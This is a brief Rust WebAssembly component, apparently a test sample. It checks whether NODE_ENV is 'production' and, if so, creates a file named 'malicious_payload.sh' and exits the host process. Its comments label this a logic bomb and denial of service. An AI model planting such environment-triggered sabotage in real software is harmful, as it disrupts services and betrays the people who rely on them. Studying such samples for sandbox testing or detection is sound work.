wit_bindgen::generate!({
    world: "component",
    path: "wit",
    generate_all
});

use exports::local::demo::guest_runner::Guest;
use wasi::filesystem::types::{PathFlags, OpenFlags, DescriptorFlags};

struct Component;

impl Guest for Component {
    fn execute() {
        // Read environment
        let envs = wasi::cli::environment::get_environment();
        let is_prod = envs.iter().any(|(k, v)| k == "NODE_ENV" && v == "production");
        
        if is_prod {
            // Write logic bomb payload
            let preopens = wasi::filesystem::preopens::get_directories();
            if let Some((dir, _)) = preopens.first() {
                let _ = dir.open_at(PathFlags::empty(), "malicious_payload.sh".to_string(), OpenFlags::CREATE, DescriptorFlags::WRITE);
            }

            // Exit the process (Denial of Service)
            wasi::cli::exit::exit(Err(()));
        }
    }
}

export!(Component);
